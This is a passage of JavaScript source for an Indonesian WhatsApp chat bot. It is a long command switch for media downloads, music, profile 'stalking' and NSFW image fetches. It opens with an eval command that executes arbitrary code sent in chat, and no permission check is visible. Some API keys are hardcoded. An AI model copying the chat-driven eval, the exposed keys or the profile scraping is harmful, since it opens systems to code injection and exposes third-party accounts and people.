                    var code = args.join(" ")
                try {
 
                if (!code) return reply('No JavaScript Code')
                let evaled;
 
                if (code.includes("--silent") && code.includes("--async")) {
                code = code.replace("--async", "").replace("--silent", "");
 
                return await eval(`(async () => { ${code} })()`)
                } else if (code.includes("--async")) {
                code = code.replace("--async", "");
        
                evaled = await eval(`(async () => { ${code} })()`);
                } else if (code.includes("--silent")) {
                code = code.replace("--silent", "");
        
                return await eval(code);
                } else evaled = await eval(code);
 
              if (typeof evaled !== "string")
            evaled = require("util").inspect(evaled, { depth: 0 });
  
            let output = clean(evaled);
            benny.sendMessage(from, `${output}`, text, {quoted: adadeh})
            } catch(err) {
                outerr = clean(err)
                reply(`Error: ${outerr}`)
            }
            function clean(text) {
            if (typeof text === "string")
              return text
                .replace(/`/g, `\`${String.fromCharCode(8203)}`)
                .replace(/@/g, `@${String.fromCharCode(8203)}`);
            // eslint-disable-line prefer-template
            else return text;
            }
            break
										case 'sticktourl':
										case 'stickertourl':
									
                                     var imgbb = require('imgbb-uploader')
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										reply(teks)
										break
										case 'sticktourl2':
										case 'stickertourl2':
									
                                         if (isQuotedSticker) {
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
                                        var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										reply(teks)
										 }
										break
										case 'asupan':
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
                    buffer = await getBaper(get_result.result)
                    benny.sendMessage(from, buffer, video, { quoted: adadeh, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
                case 'nekopoi':
				
					if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nekopoi?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    console.log(get_result)
                    txt = `Title : ${get_result.anime}\n`
                    txt += `Porducers : ${get_result.producers}\n`
                    txt += `Duration : ${get_result.duration}\n`
                    txt += `Size : ${get_result.size}\n`
                    txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    buffer = await getBaper(get_result.thumb)
                    benny.sendMessage(from, buffer, image, { quoted: adadeh, caption: txt })
                    break
                case 'spotify':
				
					if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
                    url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${lolkey}&url=${url}`)
                    get_result = get_result.result
                    txt = `Title : ${get_result.title}\n`
                    txt += `Artists : ${get_result.artists}\n`
                    txt += `Duration : ${get_result.duration}\n`
                    txt += `Popularity : ${get_result.popularity}\n`
                    txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBaper(get_result.thumbnail)
                    benny.sendMessage(from, thumbnail, image, { quoted: adadeh, caption: txt })
                    get_audio = await getBaper(get_result.link[3].link)
                    benny.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: adadeh })
                    break
                case 'spotifysearch':
				
					if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotifysearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    txt = ""
                    for (var x in get_result) {
                        txt += `Title : ${get_result[x].title}\n`
                        txt += `Artists : ${get_result[x].artists}\n`
                        txt += `Duration : ${get_result[x].duration}\n`
                        txt += `Link : ${get_result[x].link}\n`
                        txt += `Preview : ${get_result[x].preview_url}\n\n\n`
                    }
                    reply(txt)
                    break
					case 'sider':
					
					asp = await benny.messageInfo(from, ben.message.extendedTextMessage.contextInfo.stanzaId)
					teks1 = `*TELAH DIBACA:*\n`
					teks2 = `*SIDER:*\n`
					matilu = `*SIDER INFO*\n\n`
					o = 1
					p = 1
					cieya = []
					for (let y of asp.deliveries) {
					for (let t of asp.reads) {
						cieya.push(y.jid, t.jid)
						teks1 += `*${p++}.* @${t.jid.split('@')[0]}\n`
						teks2 += `*${o++}.* @${y.jid.split('@')[0]}\n`
						matilu += `${teks1}\n========================\n${teks2}\n========================\n`
					}
					}
					benny.sendMessage(from, matilu, text, {contextInfo: {mentionedJid: cieya}, quoted: adadeh})
					break
					case 'joox':
					
					if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
					data = await fetchJson(`https://tobz-api.herokuapp.com/api/joox?q=${body.slice(6)}&apikey=BotWeA`)
					teks = '-「 *Play Music From Joox* 」-\n'
					const joox = data.result
						teks += `\n- *Judul* : ${joox.title}\n- *Album* : ${joox.album}\n- *Publish At* : ${joox.dipublikasi}\n\n-「 *SELF-BOT* 」-`
					thumb = await getBaper(joox.thumb)
					reply(mess.wait)
					benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
					buffer = await getBaper(joox.mp3)
					benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${joox.title}.mp3`, quoted: adadeh})
					break
					case 'jooxplay':
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${lolkey}&query=${body.slice(10)}`)
                    get_result = get_result.result
                    tkt = `Title : ${get_result.info.song}\n`
                    tkt += `Artists : ${get_result.info.singer}\n`
                    tkt += `Duration : ${get_result.info.duration}\n`
                    tkt += `Album : ${get_result.info.album}\n`
                    tkt += `Uploaded : ${get_result.info.date}\n`
                    tkt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBaper(get_result.image)
                    benny.sendMessage(from, thumbnail, image, { quoted: adadeh, caption: tkt })
                    get_audio = await getBaper(get_result.audio[0].link)
                    benny.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: adadeh })
                    break
					case 'soundcloud':
					
					if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
						data = await fetchJson(`https://naufalhoster.xyz/dl/scdlplay?apikey=YunitaGanteng&query=${body.slice(12)}`)
						teks = '-「 *Play Music From Sound cloud* 」-\n'
						const pler = data.result
							teks += `\n- *Judul* : ${pler.title}\n- *Durasi* : ${pler.duration}\n- *Size* : ${pler.filesize}\n\n`
						thumb = await getBaper(pler.thumbnail)
						reply(mess.wait)
					benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
						buffer = await getBaper(pler.music)
						benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${pler.title}.mp3`, quoted: adadeh})
						break
						case 'playvid':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                            const playy2 = await axios.get(`https://pecundang.herokuapp.com/api/ytsearch?q=${body.slice(6)}`)
                            const mulaikah2 = playy2.data.result[0].link
                            try {
                                reply(mess.wait)
                                ytv(mulaikah2)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                                    const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                                    sendMediaURL(from, thumb, captions)
                                    await sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
					case 'playmp3':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                            const playy = await axios.get(`https://pecundang.herokuapp.com/api/ytsearch?q=${body.slice(6)}`)
                            const mulaikah = playy.data.result[0].link
                            try {
                                reply(mess.wait)
                                yta(mulaikah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                                    const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                                    sendMediaURL(from, thumb, captions)
                                    await sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
						case 'playmp32':
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					
						data = await fetchJson(`https://naufalhoster.xyz/dl/ytplayaudio?apikey=${naufalkey}&query=${body.slice(7)}`)
						teks = '-「 *Play Music From Youtubes* 」-\n'
						const play2 = data.result
							teks += `\n- *Judul* : ${play2.title}\n- *Durasi* : ${play2.duration}\n- *Size* : ${play2.filesize}\n\n-「 *${namabot}* 」-`
						thumb = await getBaper(play2.thumbnail)
						reply(mess.wait)
						buffer = await getBaper(play2.audio)
						reply(teks)
						benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${play2.title}.mp3`, quoted: adadeh})
						break
						case 'playmp33':
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay?apikey=${lolkey}&query=${body.slice(7)}`)
                    get_result = get_result.result
                    get_info = get_result.info
                    tkt = `Title : ${get_info.title}\n`
                    tkt += `Uploader : ${get_info.uploader}\n`
                    tkt += `Duration : ${get_info.duration}\n`
                    tkt += `View : ${get_info.view}\n`
                    tkt += `Like : ${get_info.like}\n`
                    tkt += `Dislike : ${get_info.dislike}\n`
                    tkt += `Description :\n ${get_info.description}\n`
                    buffer = await getBaper(get_info.thumbnail)
                    benny.sendMessage(from, buffer, image, { quoted: adadeh, caption: tkt })
                    get_audio = await getBaper(get_result.audio[3].link)
                    benny.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_info.title}.mp3`, quoted: adadeh })
                    break
						case 'pinterest':
						case 'pinteres':
						
							const papapale = body.slice(11)
							data = await fetchJson(`https://api.vhtear.com/pinterest?query=${body.slice(11)}&apikey=${vhtearkey}`)
							if (data.error) return reply(data.error)
							for (let i of data.result) {
								const amsulah = data.result
								const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
								thumb = await getBaper(pimterest)
							}
							reply(mess.wait)
					benny.sendMessage(from, thumb, image, { quoted: adadeh, caption: `- *Pinterest* : `+papapale})
							break
						case 'igstalk':
						case 'stalkig':
						
						    if (args.length < 1) return reply('Username nya mana?')
							tekss = body.slice(9)
							const optionso = {
  count: 0,
  mediaType: 'all',
	timeout: 0,
  session: "sessionid="+sID
};
							anu = await igstalk.getUserMeta(tekss, optionso)
							console.log(anu)
							reply(mess.wait)
							plor = anu.graphql.user
					teks = `*Username* : ${plor.username}\n*Fullname* : ${plor.full_name}\n*Followers* : ${plor.edge_followed_by.count}\n*Following* : ${plor.edge_follow.count}\n*Biodata* : ${plor.biography}\n*Link:* https://instagram.com/${tekss}`
							buffer = await getBaper(plor.profile_pic_url_hd)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
							case 'ceknama':
							anu = await getName(sender)
							reply(anu)
							break
							case 'cekbio':
							anu = await benny.getStatus(sender)
							reply(anu.status)
							break
							case 'igstalk2':
						case 'stalkig2':
						
						    if (args.length < 1) return reply('Username nya mana?')
							tekss = body.slice(10)
							anu = await igdl.scrapeUserPage(tekss)
							reply(mess.wait)
							console.log(anu)
					plor = anu.result
					teks = `*Username* : ${anu.user.username}\n*Fullname* : ${anu.user.full_name}\n*Followers* : ${anu.user.edge_followed_by.count}\n*Following* : ${anu.user.edge_follow.count}\n*Biodata* : ${anu.user.biography}\n*Link:* https://instagram.com/${tekss}`
							buffer = await getBaper(anu.user.profile_pic_url_hd)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
							case 'ig3':
						
						    if (args.length < 1) return reply('Username nya mana?')
							tekss = body.slice(5)	
							anu = await igdl.scrapeUserPage(tekss)
							teks = `*╔❏* *IG SEARCH*\n\n`
							for (let o of anu.medias) {
								teks += `*Caption:* ${o.text}\n*Jumlah like:* ${o.like_count}\n============================\n`
							    buffer = await getBaper(o.thumbnail)
							}
							reply(mess.wait)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
							break
							case 'igstalk3':
						case 'stalkig3':
						
						    if (args.length < 1) return reply('Username nya mana?')
							tekss = body.slice(10)
							anu = await fetchJson(`https://naufalhoster.xyz/dl/igstalk?apikey=${naufalkey}&username=${tekss}`)
							reply(mess.wait)
					plor = anu.result
					teks = `*Username* : ${plor.username}\n*Fullname* : ${plor.fullName}\n*Followers* : ${plor.followerCount}\n*Following* : ${plor.followingCount}\n*Jumlah post* : ${plor.postCount}\n*Biodata* : ${plor.biography}\n*Link:* https://instagram.com/${tekss}`
							buffer = await getBaper(plor.profile_picture.resolution_hd)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
							case 'ttstalk':
						case 'stalktt':
						
						    if (args.length < 1) return reply('Username nya mana?')
							anu = await fetchJson(`https://naufalhoster.xyz/dl/tstalk?apikey=${naufalkey}&username=${body.slice(9)}`)
							reply(mess.wait)
					teks = `*Nickname* : ${anu.result.user.nickname}\n*Loves* : ${anu.result.stats.heartCount}\n*Followers* : ${anu.result.stats.followerCount}\n*ID* : ${anu.result.user.id}`
							buffer = await getBaper(anu.result.user.avatarLarger)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
							case 'ytstalk':
						case 'stalkyt':
						
						    if (args.length < 1) return reply('Username nya mana?')
							anu = await fetchJson(`https://naufalhoster.xyz/dl/ytstalk?apikey=${naufalkey}&username=${body.slice(9)}`)
							reply(mess.wait)
					teks = `*Username* : ${anu.result.channel.username}\n*Channel Name* : ${anu.result.channel.displayname}\n*Subcribers* : ${anu.result.channel.subs}\n*Country* : ${anu.result.channel.country}\n*Views Total* : ${anu.result.channel.views}\n*Created at* : ${anu.result.channel.created_at}\n*Channel type* : ${anu.result.channel.channeltype}`
							buffer = await getBaper(anu.result.channel.avatar)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
						case 'ig':
						
						    if (args.length < 1) return reply('Link nya mana?')
							lino = body.slice(4)
							anu = await igdls(lino)
							console.log(anu)
							reply(mess.wait)
					buffer = await getBaper(anu.url_list[0])
							benny.sendMessage(from, buffer, image, {quoted: adadeh})
							break
							case 'igvid':
						
						   if (args.length < 1) return reply('Link nya mana?')
							lino = body.slice(4)
							anu = await igdls(lino)
							console.log(anu)
							reply(mess.wait)
					buffer = await getBaper(anu.url_list[0])
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: adadeh})
							break
							case 'ig2':
						
						    if (args.length < 1) return reply('Link nya mana?')
							const optionse = {
  // Number of posts to scrape: {int default: 0}
  count: 0,
  mediaType: 'all',
	timeout: 0,
  session: "sessionid="+sID
};
							anu = await igstalk.getPostMeta(args[0], optionse)
							console.log(anu)
							opc = anu.graphql.shortcode_media.display_url
					buffer = await getBaper(opc)
							benny.sendMessage(from, buffer, image, {quoted: adadeh})
							break
							case 'lk21':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${body.slice(6)}`)
							reply(mess.wait)
							plor = anu.result
							teks = `*╔❏* *LAYAR KACA 21*\n*╠❏*\n*╠❏* *Judul:* ${plor.title}\n*╠❏* *Desc:* ${plor.desc}\n*╠❏* *Genre:* ${plor.genre}\n*╠❏* *Durasi:* ${plor.duration}\n*╠❏* *Rating:* ${plor.rating}\n*╠❏* *Link:* ${plor.link}\n*╠❏* *Lokasi:* ${plor.location}\n*╠❏* *Bahasa:* ${plor.language}\n*╠❏* *Tanggal rilis:* ${plor.date_release}\n*╚❏* *Actors:* ${plor.actors}\n\n`
                	buffer = await getBaper(plor.thumbnail)
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
							break
							case 'getnamegc':
							if (!isGroup) return reply(mess.only.group)
							anu = await getName(from)
							reply(anu)
							break
							case 'infoalamat':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`https://api.vhtear.com/infoalamat?query=${body.slice(12)}&apikey=${lolkey}`)
							reply(mess.wait)
							plor = anu.result
							teks = `${plor.data}\n*Desc:* ${plor.deskripsi}`
							reply(teks)
							break
							case 'google':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${body.slice(8)}`)
							reply(mess.wait)
							teks = `*╔❏* *GOOGLE SEARCH*\n`
							o = 1
							for (let plor of anu.result) {
							teks += `*${o++}. ${plor.title}*\n*Desc:* ${plor.desc}\n*Link:* ${plor.link}\n==============================\n`
							}
							reply(teks.trim())
							break
							case 'komik':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`https://tobz-api.herokuapp.com/api/bacakomik?q=${body.slice(7)}&apikey=BotWeA`)
							reply(mess.wait)
							teks = `*╔❏* *KOMIK*\n\n`
							o = 1
							for (let plor of anu.result) {
								buffer = await getBaper(plor.thumbnail)
							teks += `*${o++}. Judul:* ${plor.judul}\n*Konsep:* ${plor.konsep_cerita}\n*Pengarang: ${plor.pengarang}*\n*Rating:* ${plor.rating}\n*Link:* ${plor.link}\n============================\n`
							}
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
							break
							case 'film':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=YunitaGanteng`)
							if (anu.status == false) return reply(anu.message)
							reply(mess.wait)
							teks = `*╔❏* *FILM*\n`
							o = 1
							for (let plor of anu.result) {
								buffer = await getBaper(plor.thumb)
							teks += `*${o++}. Judul:* ${plor.title}\n*Link:* ${plor.url}\n============================\n`
							}
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
							break
							case 'movie':
						
						    if (args.length < 1) return reply('Film apa?')
							anu = await fetchJson(`https://tobz-api.herokuapp.com/api/film?q=${body.slice(7)}&apikey=BotWeA`)
							if (anu.status == false) return reply(anu.message)
							reply(mess.wait)
							teks = `*╔❏* *FILM*\n`
							o = 1
							for (let plor of anu.result) {
								buffer = await getBaper(plor.thumb)
							teks += `*${o++}.* ${plor.judul}\n*Rating:* ${plor.rating}\n*Genre:* ${plor.genre_negara}\n*Link:* ${plor.link}\n============================\n`
							}
							benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
							break
							case 'cocofun':
						
						    if (args.length < 1) return reply('Link nya mana?')
							anu = await fetchJson(`https://naufalhoster.xyz/dl/cocofun?apikey=${naufalkey}&url=${args[0]}`)
							reply(mess.wait)
							bufer = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, bufer, image, {quoted: adadeh, caption: '*Mohon tunggu sebentar video sedang didownload!'})
					buffer = await getBaper(anu.result.video)
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', caption: anu.result.caption, quoted: adadeh})
							break
							case 'tiktokmusic':
							case 'tiktokmusik':
							if (args.length < 1) return reply('Linknya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('tiktok')) return reply(mess.error.Iv)
						buffer = await fetchJson(`http://lolhuman.herokuapp.com/api/tiktok3?apikey=oniichan&url=${args[0]}`)
						anu = await getBaper(buffer.result)
    benny.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', quoted: adadeh})
							break
						case 'tiktok':
							if (args.length < 1) return reply('Linknya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('tiktok')) return reply(mess.error.Iv)
						buffer = await fetchJson(`http://lolhuman.herokuapp.com/api/tiktok3?apikey=${lolkey}&url=${args[0]}`)
						anu = await getBaper(buffer.result)
    benny.sendMessage(from, anu, video, {mimetype: 'video/mp4', quoted: adadeh})
							break
					case 'playstore':
					if (args.length < 1) return reply('Yang mau di cari apaan?')
					anu = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=YunitaGanteng&q=${body.slice(11)}`)
					if (anu.error) return reply(anu.error)
					teks = '=================\n'
					for (let i of anu.result) {
						teks += `*Title* : ${i.title}\n*Id* : ${i.appid}\n*Developer* : ${i.developer}\n*Price* : ${i.price}\n*Link* : ${kepo(i.url)}\n=================\n`
					}
					reply(teks.trim())
					break
					case 'igsearch':
					if (args.length < 1) return reply('Yang mau di cari apaan?')
					anu = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=YunitaGanteng&q=${body.slice(10)}`)
					if (anu.error) return reply(anu.error)
					reply(mess.wait)
					teks = '=================\n'
					for (let i of anu.result) {
						teks += `*Username* : ${i.username}\n*Fullname* : ${i.full_name}\n=================\n`
						buffer = await getBaper(i.profile_pic)
					}
					benny.sendMessage(from, buffer, image, {caption: teks.trim(), quoted: adadeh})
					break
					case 'jalantikus':
					
					if (args.length < 1) return reply('Yang mau dicari apa?')
					tekss = body.slice(12)
					anu = await fetchJson(`https://pencarikode.xyz/news/sjalantikus?search=${tekss}&apikey=pais`)
					reply(mess.wait)
					teks = `*Jalan tikus* : ${tekss}\n`
					for (let i of anu.result) {
						teks += `\n*Judul:* ${i.title}\n*Link:* ${i.link}\n`
						buffer = await getBaper(i.thumb)
					}
					benny.sendMessage(from, buffer, image, {caption: teks.trim(), quoted: adadeh})
					break
					case 'ytsearch':
					if (args.length < 1) return reply('Yang mau di cari apaan?')
					anu = await ytsearch.search(body.slice(10))
					reply(mess.wait)
					teks = '*YOUTUBE SEARCH*\n\n'
					for (let i of anu.videos) {
						teks += `*Judul* : ${i.title}\n*Id* : ${i.id}\n*Channel* : ${i.channel.name}\n*Link Channel* : ${i.channel.link}\n*Duration* : ${i.duration} menit\n*Views* : ${i.views}\n============================\n`
					buffer = await getBaper(i.thumbnail)
					}
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
					break
					case 'tebakgambar':
					tebakgamb = true
					anu = await fetchJson(`https://api.zeks.xyz/api/tebakgambar?apikey=YunitaGanteng`)
					ngebuff = await getBaper(anu.result.soal)
					benny.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: adadeh }) // ur cods
                  await tebakgambar(anu.result.jawaban)
				  break
						case 'bj':case 'ero':case 'cum':case 'feet':case 'yuri':case 'trap':case 'lewd':case 'feed':case 'eron':case 'solo':case 'gasm':case 'poke':case 'anal':case 'holo':case 'tits':case 'kuni':case 'kiss':case 'erok':case 'smug':case 'baka':case 'solog':case 'feetg':case 'lewdk':case 'waifu':case 'pussy':case 'femdom':case 'cuddle':case 'eroyuri':case 'cum_jpg':case 'blowjob':case 'erofeet':case 'holoero':case 'classic':case 'erokemo':case 'fox_girl':case 'futanari':case 'lewdkemo':case 'wallpaper':case 'pussy_jpg':case 'kemonomimi':case 'nsfw_avatar':
                    buffer = await getBaper(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break
					case 'love2':
					
					anu = `https://naufalhoster.xyz/textmaker/lovegif?apikey=YunitaGanteng&text=${body.slice(7)}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'babi':
					
					anu = `https://naufalhoster.xyz/textmaker/pigtext?apikey=YunitaGanteng&text=${body.slice(6)}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'cry':
					
					anu = `http://api.lolhuman.xyz/api/random/cry?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'kiss2':
					
					anu = `http://api.lolhuman.xyz/api/random/kiss?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'kiss3':
					
					anu = `http://api.lolhuman.xyz/api/random2/kiss?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'cringe':
					
					anu = `http://api.lolhuman.xyz/api/random/cringe?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'dance':
					
					anu = `http://api.lolhuman.xyz/api/random/dance?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'kill':
					
					anu = `http://api.lolhuman.xyz/api/random/kill?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'happy':
					
					anu = `http://api.lolhuman.xyz/api/random/happy?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'bonk':
					
					anu = `http://api.lolhuman.xyz/api/random/bonk?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'smug2':
					
					anu = `http://api.lolhuman.xyz/api/random/smug?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'slap':
					
					anu = `http://api.lolhuman.xyz/api/random/slap?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'wave':
					
					anu = `http://api.lolhuman.xyz/api/random/wave?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'smile':
					
					anu = `http://api.lolhuman.xyz/api/random/smile?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
					case 'bully':
					
					anu = `http://api.lolhuman.xyz/api/random/bully?apikey=${lolkey}`
					reply(mess.wait)
					sendStickerUrl(from, anu)
					break
                case 'art':case 'bts':case 'exo':case 'elf':case 'loli':case 'neko':case 'waifu':case 'shota':case 'husbu':case 'sagiri':case 'shinobu':case 'megumin':case 'wallnime':
				    buffer = await getBaper(`http://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break
                case 'trap':case 'blowjob':case 'yaoi':case 'ecchi':case 'ahegao':case 'hololewd':case 'sideoppai':case 'animefeets':case 'animebooty':case 'animethighss':case 'animearmpits':case 'lewdanimegirls':case 'biganimetiddies':case 'animebellybutton':
                   buffer = await getBaper(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break					
					case 'jadwalsholat':
					case 'jadwalshalat':
					if (args.length < 1) return reply('Masukan nama daerah!!')
					sholat = body.slice(14)
					anu = await jadwas.getDataJadwal(sholat)
					console.log(anu)
					teks = `*JADWAL SHALAT ${sholat}*\n\n`
					for (let u of anu.result.jadwal) {
						console.log(u)
					teks += `*Tanggal:* ${u.tanggal}\n*Bulan:* ${bulan1}\n*Shubuh:* ${u.shubuh}\n*Dzuhur:* ${u.dzuhur}\n*Ashar:* ${u.ashar}\n*Maghrib:* ${u.magrib}\n*Isya:* ${u.isya}\n===========================\n`
					}
					reply(teks)
					break 
					case 'jadwalsholat2':
					case 'jadwalshalat2':
					if (args.length < 1) return reply('Masukan nama daerah!!')
					sholat = body.slice(15)
					try {
					anu = await jadwalSolat(sholat)
					console.log(anu)
					teks = `*Daerah:* ${anu.daerah}\n*Shubuh:* ${anu.shubuh}\n*Dzuhur:* ${anu.dzuhur}\n*Ashar:* ${anu.ashar}\n*Maghrib:* ${anu.maghrib}\n*Isya:* ${anu.isya}`
					reply(teks)
					} catch (err) {
						reply(err)
					}
					break 
					case 'ytmp4':
					
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
